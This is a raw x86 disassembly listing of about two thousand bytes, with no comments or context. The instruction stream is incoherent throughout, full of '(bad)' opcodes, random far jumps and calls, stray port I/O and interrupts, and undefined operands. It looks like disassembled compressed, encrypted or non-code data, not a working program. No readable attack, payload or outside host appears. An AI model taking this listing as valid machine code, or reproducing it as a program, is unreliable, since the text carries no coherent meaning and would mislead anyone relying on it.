  4142ae:	xchg   ebx,eax
  4142af:	jg     0x4142a4
  4142b1:	out    0x75,al
  4142b3:	loopne 0x41425b
  4142b5:	int    0xda
  4142b7:	mov    ebx,0xed13a880
  4142bc:	cmp    bl,ah
  4142be:	cdq    
  4142bf:	in     eax,dx
  4142c0:	popa   
  4142c1:	jo     0x414264
  4142c3:	fsub   st(3),st
  4142c5:	stos   DWORD PTR es:[edi],eax
  4142c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c7:	or     BYTE PTR [esi],al
  4142c9:	imul   ecx,DWORD PTR [eax],0xb1d0dcce
  4142cf:	adc    DWORD PTR [edi+0x57cc8458],esp
  4142d5:	dec    esi
  4142d6:	vpcmpeqw xmm5,xmm3,xmm4
  4142da:	aaa    
  4142db:	nop
  4142dc:	mov    al,0xe7
  4142de:	loopne 0x414305
  4142e0:	dec    DWORD PTR [ebp-0x1f]
  4142e3:	ins    DWORD PTR es:[edi],dx
  4142e4:	cld    
  4142e5:	test   DWORD PTR ds:0x9dafb6d9,esp
  4142eb:	push   ss
  4142ec:	aam    0x10
  4142ee:	or     esi,ebp
  4142f0:	or     ch,BYTE PTR ss:[edi]
  4142f3:	out    dx,eax
  4142f4:	rcr    DWORD PTR [eax-0x52],1
  4142f7:	repz sbb BYTE PTR [ecx],0xbb
  4142fb:	aas    
  4142fc:	push   esp
  4142fd:	lahf   
  4142fe:	pop    es
  4142ff:	mov    bh,0x61
  414301:	(bad)  
  414302:	push   ebp
  414303:	arpl   WORD PTR [ebp+0x13385ae1],dx
  414309:	mov    edi,0x91649b75
  41430e:	adc    BYTE PTR [eax-0x14],bh
  414311:	mov    al,0xbc
  414313:	cmp    dh,ah
  414315:	cmp    eax,edx
  414317:	mov    eax,ds:0xcd485fd
  41431c:	popa   
  41431d:	mov    ds:0x57d02b8b,al
  414322:	adc    bl,al
  414324:	inc    edx
  414325:	mov    ecx,fs
  414327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414328:	int    0xe0
  41432a:	adc    BYTE PTR [ebp-0x4a],0xfd
  41432e:	xor    DWORD PTR [ecx+eax*4-0x43],edi
  414332:	inc    esi
  414333:	jnp    0x414368
  414335:	jp     0x41437d
  414337:	push   ebp
  414338:	add    DWORD PTR [esi-0x54],esi
  41433b:	ret    
  41433c:	fs or  eax,0x756419b
  414342:	or     esp,DWORD PTR [edx+0x65]
  414345:	mov    cl,0xfe
  414347:	(bad)  
  414348:	xlat   BYTE PTR ds:[ebx]
  414349:	arpl   WORD PTR [eax+0x26],dx
  41434c:	push   esi
  41434d:	xchg   BYTE PTR [eax-0x59],al
  414350:	add    BYTE PTR [eax+0x2c],ch
  414353:	repnz mov dh,ah
  414356:	enter  0xf162,0x6c
  41435a:	stos   DWORD PTR es:[edi],eax
  41435b:	push   0xffffffc8
  41435d:	xor    edx,DWORD PTR [eax+0x381169b6]
  414363:	and    eax,esp
  414365:	cli    
  414366:	mov    eax,0x1ad14526
  41436b:	and    ebx,edx
  41436d:	aaa    
  41436e:	dec    ecx
  41436f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414370:	ja     0x4143c4
  414372:	mov    cl,dl
  414374:	jp     0x414355
  414376:	push   ebx
  414377:	sub    eax,0xe6bf7b77
  41437c:	mov    ebx,0x4c015ea3
  414381:	cli    
  414382:	and    ch,BYTE PTR [edx]
  414384:	push   ebx
  414385:	cmp    al,0xf9
  414387:	sbb    cl,al
  414389:	add    eax,0x65cc28a1
  41438e:	jnp    0x41431d
  414390:	inc    ecx
  414391:	mov    al,0x46
  414393:	ret    
  414394:	mov    bl,BYTE PTR [ebx]
  414396:	mov    ds:0xb6d75e4e,eax
  41439b:	dec    edi
  41439c:	int3   
  41439d:	jg     0x414396
  41439f:	sahf   
  4143a0:	and    ah,BYTE PTR [ecx-0x20e697c8]
  4143a6:	aad    0x1d
  4143a8:	cmp    eax,0x65f17efb
  4143ad:	imul   ebx,DWORD PTR [eax],0xffffff94
  4143b0:	add    BYTE PTR [eax+0x30],ah
  4143b3:	xor    cl,dl
  4143b5:	pop    edi
  4143b6:	mov    bl,0xc6
  4143b8:	inc    ecx
  4143b9:	sbb    al,dh
  4143bb:	test   DWORD PTR [edx+edi*4],ebp
  4143be:	mov    WORD PTR [edi+0x5b],?
  4143c1:	dec    esp
  4143c2:	jno    0x4143d3
  4143c4:	mov    BYTE PTR [ebp+0x7865430a],bl
  4143ca:	mov    ah,0xe9
  4143cc:	mov    bh,0x98
  4143ce:	call   0x8badf4df
  4143d3:	es xchg esp,eax
  4143d5:	pop    ds
  4143d6:	adc    dl,BYTE PTR [ebp-0x69c25d1]
  4143dc:	arpl   WORD PTR [esi+0x54347d86],sp
  4143e2:	mov    ebp,0x77513313
  4143e7:	mov    bl,0xfe
  4143e9:	add    DWORD PTR ds:0x74d7e10c,ebp
  4143ef:	stos   BYTE PTR es:[edi],al
  4143f0:	cld    
  4143f1:	mov    eax,gs
  4143f3:	xchg   ebx,eax
  4143f4:	icebp  
  4143f5:	fistp  DWORD PTR [esi-0x77d0d81]
  4143fb:	test   DWORD PTR [esi-0x6e],ecx
  4143fe:	fdiv   QWORD PTR [ebp+0x25bb9e15]
  414404:	jnp    0x41441e
  414406:	retf   
  414407:	adc    bh,bh
  414409:	in     al,dx
  41440a:	xor    eax,0xb0100e31
  41440f:	cwde   
  414410:	loop   0x414447
  414412:	fisttp DWORD PTR [esi+0x108b29cd]
  414418:	es clc 
  41441a:	sub    ah,BYTE PTR [ebx+0x53]
  41441d:	adc    edi,esp
  41441f:	(bad)  
  414423:	jg     0x41448a
  414425:	cmp    bh,BYTE PTR [eax]
  414427:	and    eax,0x598bfbdc
  41442c:	pop    ds
  41442d:	ret    
  41442e:	sub    DWORD PTR [esi+0x7ae3f797],esi
  414434:	add    esp,edx
  414436:	lods   al,BYTE PTR ds:[esi]
  414437:	out    0xe7,al
  414439:	sub    al,0x1
  41443b:	fwait
  41443c:	in     al,0xa4
  41443e:	imul   eax,DWORD PTR [esi+eiz*2-0x4b287cd4],0xea7991b5
  414449:	fstp   QWORD PTR [eax-0x3df1ce11]
  41444f:	xchg   ch,dh
  414451:	fdivr  QWORD PTR [eax]
  414453:	push   ds
  414454:	xor    al,0xf6
  414456:	popa   
  414457:	jmp    0x62d5:0x2fac2fea
  41445e:	dec    esi
  41445f:	xchg   esi,eax
  414460:	pop    ds
  414461:	inc    esp
  414462:	jmp    0x6faa:0x4afcb990
  414469:	add    eax,0x97610234
  41446e:	bound  eax,QWORD PTR [edi]
  414470:	outs   dx,BYTE PTR ds:[esi]
  414471:	sbb    al,0x1
  414473:	xor    BYTE PTR [ebx-0x65],0x88
  414477:	repz xchg ebx,eax
  414479:	out    dx,al
  41447a:	pop    ss
  41447b:	push   eax
  41447c:	test   al,0x8
  41447e:	idiv   DWORD PTR [ebx-0x9]
  414481:	cmc    
  414482:	cdq    
  414483:	jmp    0x8621:0x65f7e484
  41448a:	neg    BYTE PTR ds:0x8b803c11
  414490:	pop    ds
  414491:	mov    dl,0xd6
  414493:	hlt    
  414494:	(bad)  
  414495:	leave  
  414496:	pop    edi
  414497:	sti    
  414498:	loope  0x4144c5
  41449a:	out    0xb8,al
  41449c:	call   0x7160:0x8a2a5432
  4144a3:	push   ecx
  4144a4:	adc    ebp,0x9cf27a72
  4144aa:	fisub  WORD PTR gs:[ebp+0x7a]
  4144ae:	retf   
  4144af:	jge    0x4144a3
  4144b1:	and    dh,cl
  4144b3:	sbb    BYTE PTR [edi],0xc8
  4144b6:	pop    ds
  4144b7:	mov    bh,0xca
  4144b9:	loope  0x414497
  4144bb:	mov    fs,esp
  4144bd:	dec    ecx
  4144be:	inc    edx
  4144bf:	cmp    BYTE PTR [edx+eiz*8+0x1e],bh
  4144c3:	fadd   QWORD PTR [ebp+0x5d960972]
  4144c9:	out    0xab,eax
  4144cb:	jle    0x41449f
  4144cd:	mov    ecx,0xe247f0f0
  4144d2:	dec    ebp
  4144d3:	xchg   ebp,eax
  4144d4:	inc    edi
  4144d5:	fstp   DWORD PTR [eax+0x53]
  4144d8:	sbb    BYTE PTR [ebx-0x23784427],bl
  4144de:	out    0x12,eax
  4144e0:	lods   eax,DWORD PTR ds:[esi]
  4144e1:	add    BYTE PTR [ebx+0x6c2f807a],bh
  4144e7:	dec    esi
  4144e8:	push   ebp
  4144e9:	shl    BYTE PTR [ebx+eax*1],1
  4144ec:	out    0xde,eax
  4144ee:	das    
  4144ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144f0:	ins    DWORD PTR es:[edi],dx
  4144f1:	xchg   DWORD PTR [ecx-0x51],ecx
  4144f4:	lds    ecx,FWORD PTR [eax-0x1c]
  4144f7:	xor    ebx,DWORD PTR [edx+0x1de04339]
  4144fd:	push   esi
  4144fe:	mov    ds:0xb3f1c830,eax
  414503:	jge    0x4144fb
  414505:	in     eax,dx
  414506:	fsub   QWORD PTR [eax-0x64]
  414509:	cmp    al,0x2
  41450b:	push   ebx
  41450c:	aam    0x56
  41450e:	mov    ecx,0xf12be7fc
  414513:	ins    DWORD PTR es:[edi],dx
  414514:	mov    dh,BYTE PTR [ebx]
  414516:	int    0x6d
  414518:	idiv   BYTE PTR [esi-0x29ebe0b2]
  41451e:	ja     0x414587
  414520:	adc    edx,DWORD PTR [edx-0x15]
  414523:	pop    ds
  414524:	ss jmp 0x136b:0xa9b0c423
  41452c:	jmp    FWORD PTR [edi+0x5d8de441]
  414532:	out    dx,al
  414533:	mov    eax,ds
  414535:	add    esi,esp
  414537:	sub    eax,DWORD PTR [esi-0x69]
  41453a:	mov    WORD PTR [eax+0x7eff343b],es
  414540:	jb     0x414538
  414542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414543:	sub    al,0x2
  414545:	cmp    eax,0x9ec84dea
  41454a:	and    al,0x1d
  41454c:	add    edi,DWORD PTR [eax]
  41454e:	mov    dl,0xc9
  414550:	inc    eax
  414551:	retf   
  414552:	dec    edx
  414553:	pop    esi
  414554:	sub    DWORD PTR [edx-0x76],esi
  414557:	jle    0x4145a3
  414559:	(bad)  
  41455a:	pushf  
  41455b:	test   al,0x8
  41455d:	fdivr  st,st(0)
  41455f:	ins    DWORD PTR es:[edi],dx
  414560:	fst    DWORD PTR ds:0xeff2a72c
  414566:	lods   eax,DWORD PTR ds:[esi]
  414567:	aas    
  414568:	push   esp
  414569:	mov    dl,0x30
  41456b:	jnp    0x4145a9
  41456d:	dec    ecx
  41456e:	xor    bl,BYTE PTR ss:[ecx-0x2f]
  414572:	jmp    0x4144f8
  414574:	pop    es
  414575:	aam    0x7
  414577:	arpl   WORD PTR [ebx],sp
  414579:	pop    esi
  41457a:	jnp    0x4145a2
  41457c:	lock aaa 
  41457e:	shr    BYTE PTR [ebp-0x3e],0x2e
  414582:	sub    cl,dh
  414584:	jo     0x414543
  414586:	icebp  
  414587:	sbb    dl,BYTE PTR ds:[ecx+0x5c47ea3f]
  41458e:	test   DWORD PTR [eax],ebp
  414590:	mov    BYTE PTR [ebp+0x577be077],dl
  414596:	jge    0x4145b8
  414598:	sub    eax,0x737ada02
  41459d:	int3   
  41459e:	jb     0x41453a
  4145a0:	out    0xef,al
  4145a2:	inc    edi
  4145a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145a4:	mov    esi,0xb3361b38
  4145a9:	call   0xf2f4:0x907a7014
  4145b0:	popa   
  4145b1:	in     al,dx
  4145b2:	mov    al,0xdf
  4145b4:	and    DWORD PTR [ebp-0x61],esi
  4145b7:	shl    BYTE PTR ds:0x18ebfaf5,1
  4145bd:	cld    
  4145be:	add    eax,0xbfb95039
  4145c3:	cmc    
  4145c4:	xor    bh,BYTE PTR [ebx-0x54]
  4145c7:	retf   
  4145c8:	pop    edx
  4145c9:	imul   esp,edx,0xe22bc4a5
  4145cf:	mov    al,ds:0xfad489bf
  4145d4:	mov    ecx,DWORD PTR [eax+ecx*2]
  4145d7:	clc    
  4145d8:	inc    ebx
  4145d9:	fs pop edi
  4145db:	inc    edx
  4145dc:	xchg   ch,dl
  4145de:	ffreep st(0)
  4145e0:	pop    es
  4145e1:	pop    esp
  4145e2:	sar    BYTE PTR [ecx+0x54],cl
  4145e5:	mov    al,ds:0x6a7e6220
  4145ea:	and    al,BYTE PTR [edi+0x27]
  4145ed:	not    DWORD PTR [edx+0xd]
  4145f0:	push   esp
  4145f1:	(bad)  
  4145f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f3:	xor    ah,ch
  4145f5:	sbb    ebx,ecx
  4145f7:	inc    eax
  4145f8:	add    al,0x6
  4145fa:	add    esi,esp
  4145fc:	xchg   esp,eax
  4145fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fe:	xchg   BYTE PTR [edi-0x64],dh
  414601:	xor    eax,0x923dc0ac
  414606:	push   cs
  414607:	xor    dh,BYTE PTR [esi+0x24]
  41460a:	(bad)  
  41460b:	lea    ebx,[eax]
  41460d:	jnp    0x414650
  41460f:	jns    0x4145ba
  414611:	data16 stos BYTE PTR es:[edi],al
  414613:	retf   0x3c95
  414616:	loop   0x414616
  414618:	and    BYTE PTR [eax],dh
  41461a:	pop    ebx
  41461b:	pusha  
  41461c:	cld    
  41461d:	(bad)  
  41461e:	lock sbb ax,0xffee
  414623:	retf   
  414624:	cdq    
  414625:	and    BYTE PTR [edx+ebp*4],dl
  414628:	or     edx,DWORD PTR [ebx*8-0x23188dc6]
  41462f:	pop    ecx
  414630:	xor    DWORD PTR [ebp-0x4d7b0d27],ecx
  414636:	add    ebx,edi
  414638:	mov    dl,0x98
  41463a:	sub    al,0x57
  41463c:	dec    edx
  41463d:	icebp  
  41463e:	(bad)  
  41463f:	out    0x92,eax
  414641:	(bad)  
  414642:	sti    
  414643:	mov    eax,ds:0xad47d4a9
  414648:	jg     0x41460c
  41464a:	push   edx
  41464b:	in     eax,0x5f
  41464d:	adc    esi,DWORD PTR [esi+eiz*4-0x2b]
  414651:	dec    edi
  414652:	pusha  
  414653:	push   cs
  414654:	in     al,dx
  414655:	push   es
  414656:	push   ebx
  414657:	mov    eax,0x15f26c22
  41465c:	sahf   
  41465d:	jb     0x4145f6
  41465f:	sbb    BYTE PTR [edx+0x35],dl
  414662:	adc    DWORD PTR [ebp+0x2d4c6f7e],eax
  414668:	add    BYTE PTR [edx+ecx*1+0x38],bl
  41466c:	xchg   DWORD PTR [edx+edx*4-0x5d],eax
  414670:	stos   BYTE PTR es:[edi],al
  414671:	xor    BYTE PTR [edi-0xf97c08],cl
  414677:	ja     0x414658
  414679:	jmp    0x414642
  41467b:	addr16 mov dl,0x4e
  41467e:	xchg   ecx,eax
  41467f:	pop    esp
  414680:	jecxz  0x4146b3
  414682:	sub    DWORD PTR [ebx-0x4ae54cb4],eax
  414688:	aas    
  414689:	sbb    BYTE PTR [esi-0x5f5aa1fa],al
  41468f:	ret    0x3285
  414692:	test   al,0x99
  414694:	adc    esi,DWORD PTR ds:0x5ec90d32
  41469a:	(bad)  
  41469b:	pop    eax
  41469c:	int    0x1c
  41469e:	push   esi
  41469f:	add    dl,BYTE PTR [edi+ebp*2]
  4146a2:	stos   BYTE PTR es:[edi],al
  4146a3:	sub    DWORD PTR [eax-0x15],edi
  4146a6:	shl    ch,1
  4146a8:	xchg   esi,eax
  4146a9:	add    ebp,DWORD PTR [eax]
  4146ab:	sbb    eax,0x49028767
  4146b0:	into   
  4146b1:	sahf   
  4146b2:	and    al,0x1a
  4146b4:	xor    eax,0x8058947b
  4146b9:	xchg   edx,eax
  4146ba:	ret    0xa62e
  4146bd:	mov    ebp,DWORD PTR [ebx+0x4]
  4146c0:	inc    esi
  4146c1:	push   0x29
  4146c3:	lea    esi,[esi]
  4146c5:	or     al,0x3b
  4146c7:	sbb    eax,0xfc7dd757
  4146cc:	int    0x19
  4146ce:	loopne 0x4146f2
  4146d0:	je     0x414679
  4146d2:	add    eax,0xecaae13c
  4146d7:	aam    0x84
  4146d9:	mov    bh,BYTE PTR [edx]
  4146db:	popf   
  4146dc:	inc    esi
  4146dd:	fwait
  4146de:	ds push ebp
  4146e0:	push   ds
  4146e1:	xchg   DWORD PTR [esi+0x520997b5],ecx
  4146e7:	adc    DWORD PTR [esp+ebp*1-0x6c0f030c],eax
  4146ee:	mov    cl,BYTE PTR [ebx+0x5fa30943]
  4146f4:	ret    0xfacb
  4146f7:	dec    edi
  4146f8:	push   0x9cddac17
  4146fd:	sar    DWORD PTR [ebx+esi*8],1
  414700:	clc    
  414701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414702:	add    eax,DWORD PTR [ebp+esi*8-0x36]
  414706:	or     bl,bh
  414708:	shr    BYTE PTR [ebx-0xf],1
  41470b:	in     al,dx
  41470c:	repnz push ebx
  41470e:	jle    0x41470e
  414710:	pushf  
  414711:	enter  0x6f09,0x89
  414715:	and    al,0x31
  414717:	mov    eax,0xc2089c28
  41471c:	lock retf 
  41471e:	gs jecxz 0x41479a
  414721:	and    bl,ch
  414723:	pusha  
  414724:	cmp    esp,DWORD PTR [eax+0x13]
  414727:	jae    0x4146e5
  414729:	and    ch,bl
  41472b:	jle    0x414711
  41472d:	daa    
  41472e:	mov    cl,0x5b
  414730:	cmp    DWORD PTR [eax-0x5b],edx
  414733:	add    al,0x19
  414735:	add    edi,DWORD PTR [edx+0x69]
  414738:	pop    esp
  414739:	inc    ebp
  41473a:	dec    ebp
  41473b:	sbb    BYTE PTR [ecx],dl
  41473d:	sbb    esi,DWORD PTR [ebp-0x63]
  414740:	jae    0x414780
  414742:	fwait
  414743:	and    DWORD PTR [edi-0x27],edi
  414746:	mov    edi,0x96b575b8
  41474b:	jb     0x4147ac
  41474d:	loop   0x4146f0
  41474f:	ret    
  414750:	jg     0x4146fc
  414752:	add    BYTE PTR [ebp+0x193a5273],0xd8
  414759:	gs int 0x7d
  41475c:	cmp    DWORD PTR [eax],esi
  41475e:	push   DWORD PTR [ebx]
  414760:	je     0x4147a7
  414762:	mov    ebp,0x98c81db
  414767:	xlat   BYTE PTR ds:[ebx]
  414768:	cmp    BYTE PTR ds:0xfe56975a,al
  41476e:	ds or  eax,0x13ba7025
  414774:	in     eax,dx
  414775:	lods   eax,DWORD PTR ds:[esi]
  414776:	aaa    
  414777:	inc    eax
  414778:	mov    ds:0x732e2325,eax
  41477d:	pop    ss
  41477e:	push   0x25d71126
  414783:	or     cl,al
  414785:	pop    ds
  414786:	push   esi
  414787:	sbb    ecx,edx
  414789:	mov    al,0x6a
  41478b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478c:	jno    0x41476c
  41478e:	mov    ebx,ecx
  414790:	adc    dl,BYTE PTR [ebx]
  414792:	or     eax,0x78388f8c
  414797:	sbb    al,0x55
  414799:	jge    0x414778
  41479b:	mov    edi,0x4d2a2408
  4147a0:	ret    0x9714
  4147a3:	jne    0x414813
  4147a5:	push   edx
  4147a6:	int3   
  4147a7:	inc    ebx
  4147a8:	shr    DWORD PTR [edx],0xfd
  4147ab:	pop    edx
  4147ac:	call   0x94ae71af
  4147b1:	push   ebp
  4147b2:	push   ds
  4147b3:	jne    0x4147bd
  4147b5:	shrd   DWORD PTR [ecx-0x34b9bb5f],esp,cl
  4147bc:	xor    BYTE PTR [eax+0x59b9c711],dh
  4147c2:	loope  0x4147b3
  4147c4:	jl     0x414800
  4147c6:	test   eax,0x8534be44
  4147cb:	aad    0xba
  4147cd:	adc    cl,BYTE PTR [ecx+0x3b9fe493]
  4147d3:	bound  edi,QWORD PTR [ecx+0x937ecea]
  4147d9:	ret    0x47cf
  4147dc:	dec    edi
  4147dd:	ret    
  4147de:	shr    BYTE PTR [esi-0x177d202d],0xa6
  4147e5:	push   ds
  4147e6:	push   ss
  4147e7:	cdq    
  4147e8:	popf   
  4147e9:	adc    al,0x42
  4147eb:	inc    esp
  4147ec:	mov    BYTE PTR [ebx+0x246fa380],bl
  4147f2:	mov    DWORD PTR [esi-0x3cc5bcfa],ecx
  4147f8:	push   esi
  4147f9:	lea    edi,[esi+0x6b]
  4147fc:	xchg   edx,eax
  4147fd:	les    edx,FWORD PTR [ebx+0x72e990f]
  414803:	and    eax,0x47e61645
  414808:	adc    DWORD PTR [esi],0xf314d610
  41480e:	jo     0x414821
  414810:	(bad)  
  414811:	mov    esi,0x9826e24e
  414816:	and    bh,bh
  414818:	dec    ebx
  414819:	sbb    esp,eax
  41481b:	mov    cl,0x7
  41481d:	push   0xffffff98
  41481f:	lahf   
  414820:	into   
  414821:	icebp  
  414822:	sbb    BYTE PTR [ebx+ecx*4],dl
  414825:	pop    edx
  414826:	cs (bad) 
  414829:	xchg   ebp,eax
  41482a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41482b:	add    al,0x53
  41482d:	jmp    0x414867
  41482f:	fs repz dec ebx
  414832:	stos   BYTE PTR es:[edi],al
  414833:	in     al,dx
  414834:	bound  ecx,QWORD PTR [ebp+0x6475d7b3]
  41483a:	dec    ebx
  41483b:	fld    TBYTE PTR [edx]
  41483d:	adc    eax,0x1f5e7e8f
  414842:	nop
  414843:	add    BYTE PTR [ecx-0x21],ah
  414846:	or     al,BYTE PTR [ebp+0x7f]
  414849:	setg   BYTE PTR [esi-0x7e]
  41484d:	(bad)  
  41484f:	push   esi
  414850:	inc    ecx
  414851:	sar    DWORD PTR [eax-0x73],1
  414854:	jo     0x41486b
  414856:	xor    DWORD PTR [ebp-0x269761fe],eax
  41485c:	dec    eax
  41485d:	cmp    DWORD PTR [ebx-0x18],ecx
  414860:	inc    edx
  414861:	or     al,0xf3
  414863:	mov    bh,0x87
  414865:	js     0x414864
  414867:	loop   0x414817
  414869:	xchg   ebp,eax
  41486a:	pop    eax
  41486b:	pop    edi
  41486c:	sub    BYTE PTR [esp+ebx*2],dh
  41486f:	adc    al,BYTE PTR [eax-0x4e]
  414872:	mov    bh,0x7a
  414874:	les    esp,FWORD PTR [edi+0x5db00f0c]
  41487a:	sub    BYTE PTR [ebp-0x23],dh
  41487d:	cwde   
  41487e:	and    ch,bl
  414880:	dec    ebp
  414881:	xor    BYTE PTR [ecx+0x10],bl
  414884:	or     esi,DWORD PTR [edi-0x4b6106ee]
  41488a:	jnp    0x4148cc
  41488c:	cli    
  41488d:	fs jg  0x414872
  414890:	sbb    eax,edx
  414892:	jns    0x414856
  414894:	dec    esp
  414895:	jne    0x4148d8
  414897:	or     esp,ebp
  414899:	scas   al,BYTE PTR es:[edi]
  41489a:	mov    bh,0x8b
  41489c:	xchg   esi,eax
  41489d:	leave  
  41489e:	outs   dx,BYTE PTR ds:[esi]
  41489f:	enter  0xd839,0x27
  4148a3:	sbb    eax,0x282878d5
  4148a8:	push   ds
  4148a9:	adc    cl,dl
  4148ab:	dec    edi
  4148ac:	out    dx,eax
  4148ad:	int    0xd7
  4148af:	mov    esi,0x850cf922
  4148b4:	inc    edi
  4148b5:	mov    ds:0x8992e49c,eax
  4148ba:	(bad)  
  4148bb:	mov    dl,0x57
  4148bd:	into   
  4148be:	int    0x7b
  4148c0:	ds fwait
  4148c2:	sub    edi,edx
  4148c4:	push   es
  4148c5:	jl     0x4148bd
  4148c7:	add    eax,0x7e3ad611
  4148cc:	retf   
  4148cd:	mov    ch,0x15
  4148cf:	pushf  
  4148d0:	sub    al,0xd9
  4148d2:	mov    dl,0xee
  4148d4:	push   ebx
  4148d5:	jo     0x4148cb
  4148d7:	(bad)  
  4148d8:	scas   al,BYTE PTR es:[edi]
  4148d9:	cdq    
  4148da:	(bad)  
  4148db:	jge    0x4148a0
  4148dd:	push   esi
  4148de:	jg     0x4148a7
  4148e0:	pop    esi
  4148e1:	dec    ebp
  4148e2:	imul   eax,DWORD PTR [edi-0x6ace4184],0xffffffe6
  4148e9:	daa    
  4148ea:	mov    ebp,0xa94afca7
  4148ef:	jge    0x414873
  4148f1:	or     eax,0xc58f4c03
  4148f6:	mov    WORD PTR [ecx-0x45c62863],?
  4148fc:	jmp    0x855f7c72
  414901:	cwde   
  414902:	ret    0x6489
  414905:	jne    0x4148b4
  414907:	fild   QWORD PTR [eax+ebp*8+0xf]
  41490b:	stos   BYTE PTR es:[edi],al
  41490c:	mov    bl,0xcb
  41490e:	test   bh,0xe2
  414911:	or     eax,0x608efb06
  414916:	or     BYTE PTR [edi-0x3f],ah
  414919:	sub    ebx,edx
  41491b:	push   ebp
  41491c:	xlat   BYTE PTR ds:[ebx]
  41491d:	jmp    0x4148a4
  41491f:	cmp    al,0x15
  414921:	push   esi
  414922:	cwde   
  414923:	xchg   ebx,eax
  414924:	pop    es
  414925:	xchg   ebx,eax
  414926:	aam    0x2b
  414928:	mov    ebp,0x44f4d813
  41492d:	xchg   ecx,eax
  41492e:	iret   
  41492f:	and    ecx,edx
  414931:	(bad)  
  414933:	cdq    
  414934:	mov    bl,0x17
  414936:	ret    0x88b6
  414939:	and    al,0x27
  41493b:	pop    esi
  41493c:	push   edi
  41493d:	and    eax,0xb86ca9a0
  414942:	mov    al,bl
  414944:	mov    ah,0x86
  414946:	push   ss
  414947:	cmp    ch,al
  414949:	jne    0x414980
  41494b:	stc    
  41494c:	repnz fild DWORD PTR ds:0x261245c8
  414953:	add    al,0xf7
  414955:	pop    ss
  414956:	jecxz  0x41498e
  414958:	jns    0x414951
  41495a:	dec    ebp
  41495b:	js     0x41494d
  41495d:	mov    ebp,DWORD PTR [eax]
  41495f:	xor    esi,DWORD PTR [esp+ebp*8+0x33]
  414963:	push   cs
  414964:	sub    BYTE PTR [esi-0x5a],0x1f
  414968:	jae    0x414998
  41496a:	sub    eax,0xd3bf7576
  41496f:	xchg   ebx,eax
  414970:	scas   eax,DWORD PTR es:[edi]
  414971:	enter  0x319f,0x29
  414975:	popf   
  414976:	push   es
  414977:	ror    ecx,1
  414979:	xor    DWORD PTR [ebx-0x37879f88],eax
  41497f:	pop    eax
  414980:	nop
  414981:	fs add eax,0x3a1306ae
  414987:	frndint 
  414989:	ret    
  41498a:	mov    bh,BYTE PTR [ecx-0x7d3dec88]
  414990:	addr16 mov ebp,0xccf6cbc7
  414996:	xor    eax,0x91b3b9da
  41499b:	mov    ebp,0xd94a132e
  4149a0:	cdq    
  4149a1:	xor    DWORD PTR [ecx+0x3357385a],ecx
  4149a7:	bswap  bp
  4149aa:	add    eax,0xa6396bd7
  4149af:	cmp    eax,DWORD PTR [edi]
  4149b1:	mov    BYTE PTR [ecx-0x144cd11b],0x2f
  4149b8:	add    esi,DWORD PTR [eax]
  4149ba:	inc    ebx
  4149bb:	and    eax,0xbbaf0327
  4149c0:	imul   ebp,DWORD PTR ds:0x7413406a,0x9f6c5822
  4149ca:	fimul  WORD PTR [ecx-0x1a87193]
  4149d0:	sbb    eax,0xb401b004
  4149d5:	cs test esp,0xe57d6656
  4149dc:	das    
  4149dd:	iret   
  4149de:	mov    ecx,0xcd7f93fb
  4149e3:	(bad)  
  4149e4:	imul   edi,DWORD PTR [esi+0x6],0xffffffb4
  4149e8:	jmp    0x4149fd
  4149ea:	lea    ebx,[ecx+0x1c33c7c6]
  4149f0:	jns    0x414a5c
  4149f2:	mov    dh,cl
  4149f4:	sti    
  4149f5:	adc    DWORD PTR [ebp-0x64],edi
  4149f8:	add    edx,ecx
  4149fa:	pop    edi
  4149fb:	ds ror bl,cl
  4149fe:	ds call 0x4376:0x16b1370e
  414a06:	out    dx,al
  414a07:	sar    DWORD PTR [edi+0x1e],cl
  414a0a:	test   DWORD PTR [esi-0x753567a4],ebx
  414a10:	test   al,0xfd
  414a12:	aam    0x7e
  414a14:	loop   0x414a08
  414a16:	mov    dl,dl
  414a18:	cli    
  414a19:	xlat   BYTE PTR ds:[ebx]
  414a1a:	sbb    ch,BYTE PTR [ebp-0x27]
  414a1d:	fistp  DWORD PTR [ebx+0x16b064ec]
  414a23:	push   esp
  414a24:	sahf   
  414a25:	cmp    bl,BYTE PTR [esi-0x23]
  414a28:	neg    BYTE PTR [ebx+0x6ef395fe]
  414a2e:	mov    edx,0x47948879
  414a33:	call   0x59775cdf
  414a38:	mov    bl,0x5c
  414a3a:	lods   al,BYTE PTR ds:[esi]
  414a3b:	lds    edi,FWORD PTR [eax-0x5b]
  414a3e:	pop    eax
  414a3f:	(bad)  
  414a40:	lds    ecx,FWORD PTR ss:[edi+0x7b]
  414a44:	out    0x1c,al
  414a46:	xchg   esp,eax
  414a47:	xchg   ebp,eax
  414a48:	stos   DWORD PTR es:[edi],eax
  414a49:	pop    ds
  414a4a:	sub    bh,BYTE PTR [edi+0x440d43a4]
  414a50:	xor    al,0x2f
  414a52:	(bad)  
  414a54:	aad    0x18
  414a56:	dec    ebp
  414a57:	es xchg ecx,eax
  414a59:	mov    eax,0xaf95237e
  414a5e:	popa   
  414a5f:	fcmovnb st,st(2)
  414a61:	sbb    dh,BYTE PTR [ebp+eax*2+0x6c759487]
  414a68:	repnz dec esp
  414a6a:	js     0x414a58
  414a6c:	sbb    BYTE PTR [edx+0x37],0xa2
  414a70:	add    cl,ch
  414a72:	cmp    al,0xe2
  414a74:	mov    ds:0x57f3a8b0,eax
  414a79:	jmp    0x414ac1
  414a7b:	xor    esi,DWORD PTR [eax+eax*1+0x46]
  414a7f:	mov    ss,ebx
  414a81:	ss pusha 
  414a83:	fwait
  414a84:	xchg   esi,eax
  414a85:	xlat   BYTE PTR ds:[ebx]
  414a86:	(bad)  
  414a87:	mov    esi,0x7aa28343
  414a8c:	pop    ds
  414a8d:	or     ebp,0xffffffc8
  414a90:	sbb    eax,0xd2533cef
  414a95:	(bad)  
  414a96:	fs inc edx
  414a98:	cli    
  414a99:	push   ebx
  414a9a:	ficomp WORD PTR [eax-0x7dfd032a]
  414aa0:	int    0x47
